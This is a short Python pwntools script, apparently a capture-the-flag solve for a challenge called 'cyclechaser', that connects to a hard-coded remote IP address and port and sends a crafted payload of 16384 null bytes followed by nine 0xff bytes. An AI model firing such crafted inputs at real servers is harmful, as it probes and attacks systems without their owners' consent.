from pwn import *
yy = b'\x00'
zz= b'\xff'
x = yy*16384+zz*9

#io = process("./cyclechaser")#
io = remote('3.123.91.129',13339)
print('seed', io.recvline())
#io.recvline()
io.sendline(x)

ret = io.recvline()
print(ret)
io.close()